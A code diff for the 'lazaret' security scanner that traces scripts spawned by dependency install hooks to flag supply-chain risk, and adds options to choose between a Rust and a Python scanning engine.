+        for started, stext in _started_dependency_scripts(tree, rel, text, base, out, extra, run):
+            more = engine.install_script_risk(stext) if stext else []
+            if more and issue["sev"] not in ("BLOCKER", "CRITICAL"):
+                shown = started[len(base) + 1:] if base and started.startswith(base + "/") else started
+                msg = f"Install hook runs {target}, which starts {shown}, which {'; and '.join(more)}."
+                issue["sev"] = "CRITICAL"
+                issue["msg"] = _redact_text(msg) if REDACT_SECRETS else msg
+
+
+def _started_dependency_scripts(tree, rel, text, cwd, out, extra, run):
+    """[(rel, text)] for the scripts a dependency's install script `rel`
+    starts with node or python, and those they start (spawned_scripts), at
+    most _SPAWN_MAX_DEPTH starts deep and _SPAWN_MAX_FILES files. `cwd`: the
+    package's directory, where a plain literal path is read from."""
+    found, seen, queue = [], {rel}, [(rel, text, 0)]
+    while queue and len(seen) <= _SPAWN_MAX_FILES:
+        cur, cur_text, depth = queue.pop(0)
+        if not cur_text or depth >= _SPAWN_MAX_DEPTH:
+            continue
+        for where, path in spawned_scripts(cur_text):
+            joined = _tree_join(posixpath.dirname(cur) if where == "dir" else cwd, path)
+            nxt = tree.resolve(joined) if joined is not None else None
+            if nxt is None or nxt in seen or len(seen) > _SPAWN_MAX_FILES:
+                continue
+            seen.add(nxt)
+            lang = "py" if nxt.endswith(".py") else ("sh" if nxt.endswith(".sh") else "js")
+            ntext = _dependency_script_text(tree, nxt, lang, out, extra, run)
+            found.append((nxt, ntext))
+            queue.append((nxt, ntext, depth + 1))
+    return found
 
 
 def _dependency_script_text(tree, rel, as_lang, out, extra, run):
@@ -9912,11 +12302,12 @@ def _read_dependency_script(tree, rel, as_lang, out, extra):
     return text
 
 
-def dependency_import_issue(path, text, lang=None):
+def dependency_import_issue(path, text, lang=None, risk=None):
     """SC-IMPORT-RISK (MAJOR, or CRITICAL: import_time_severity) for a
     dependency's JavaScript or Python file (`lang` 'js' or 'py') that fails
-    the import-time test (import_time_risk), else None."""
-    reasons, line = import_time_risk(text, lang)
+    the import-time test (import_time_risk; `risk`: its answer, when the
+    caller has it already), else None."""
+    reasons, line = risk if risk is not None else import_time_risk(text, lang)
     if not reasons:
         return None
     lines = text.split("\n")
@@ -10919,6 +13310,9 @@ def _positive_int(text):
 def _main(argv=None):
     global REDACT_SECRETS, EXCERPT_WIDTH, SOURCE_SIZE_CAP
     ap = argparse.ArgumentParser(prog="lazaret", description="Lazaret — security & quality scanner for Python/JS projects.")
+    from lazaret.scanner import engine     # (imported here: engine imports core)
+    ap.add_argument("--version", action="version",
+                    version=f"lazaret {_lazaret_pkg.__version__} (engine: {engine.describe()})")
     ap.add_argument("directory", help="Project directory to scan")
     ap.add_argument("--out-dir", metavar="DIR",
                     help="Directory for the default reports (default: the scan root). "
@@ -10970,8 +13364,17 @@ def _main(argv=None):
                     help=f"Largest source file or manifest read (default {SOURCE_SIZE_CAP:,}, env "
                          f"LAZARET_MAX_SOURCE_BYTES); a larger one is not scanned and gets "
                          f"SC-TRUNCATED, which fails the gate")
+    ap.add_argument("--engine", choices=engine.ENGINES, default=None,
+                    help="The engine that runs the supply-chain tests: rust (the native engine, the default "
+                         "where it is installed) or python (the reference engine; env LAZARET_ENGINE). Both "
+                         "give the same findings.")
     ap.add_argument("-q", "--quiet", action="store_true")
     args = ap.parse_args(argv)
+    try:
+        engine.choose(args.engine)
+    except engine.EngineError as exc:
+        print(f"error: {exc}", file=sys.stderr)
+        sys.exit(EXIT_USAGE)
     REDACT_SECRETS = not args.no_redact_secrets
     EXCERPT_WIDTH = args.excerpt_width
     if args.max_source_bytes:
